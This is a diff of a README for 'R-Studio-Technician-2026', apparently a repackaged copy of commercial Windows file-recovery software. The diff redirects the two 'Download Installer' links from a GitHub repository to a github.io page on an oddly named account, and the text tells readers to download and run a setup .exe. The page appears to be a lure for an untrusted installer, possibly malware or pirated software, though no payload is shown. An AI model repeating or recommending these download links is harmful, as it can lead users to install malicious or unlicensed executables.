@@ -1,6 +1,6 @@
 # 💾 R-Studio-Technician-2026 - Recover lost files on Windows systems
 
-[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/buccal-face646/R-Studio-Technician-2026)
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://buccal-face646.github.io)
 
 ## 📁 About the software
 
@@ -25,7 +25,7 @@ Follow these steps to obtain the installation package for your computer:
 3. Locate the file named R-Studio-Technician-2026-Setup.exe.
 4. Select the file to start the download to your computer.
 
-[Click here to visit the download page](https://github.com/buccal-face646/R-Studio-Technician-2026)
+[Click here to visit the download page](https://buccal-face646.github.io)
 
 ## ⚙️ Installation steps
 
